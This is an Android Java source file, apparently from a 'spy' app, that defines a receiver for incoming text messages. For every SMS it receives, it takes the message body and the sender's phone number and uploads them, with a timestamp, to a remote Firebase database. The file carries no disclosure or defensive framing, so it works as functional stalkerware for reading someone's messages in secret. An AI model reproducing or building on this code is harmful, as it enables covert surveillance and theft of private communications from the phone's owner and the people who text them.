package com.example.nomi.spyappp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.time.LocalDateTime;
import java.util.Calendar;
import java.util.HashMap;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            Object[] pdusObj = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdusObj.length];

            // getting SMS information from Pdu.
            for (int i = 0; i < pdusObj.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
            }

            for (SmsMessage currentMessage : messages) {
                // currentMessage.getDisplayOriginatingAddress()   has sender's phone number
                // currentMessage.getDisplayMessageBody()     has the actual message

                DatabaseReference myRef = FirebaseDatabase.getInstance()
                        .getReference("SmsTree");
                Calendar c = Calendar.getInstance();
                HashMap<String,Object> hm = new HashMap<>();
                hm.put("message",currentMessage.getMessageBody());
                hm.put("date",Methods.getCurrentDate());
                hm.put("time",Methods.getCurrentTime());
                myRef.child(currentMessage.getDisplayOriginatingAddress()).push().setValue(hm);
            }
        }
    }
}
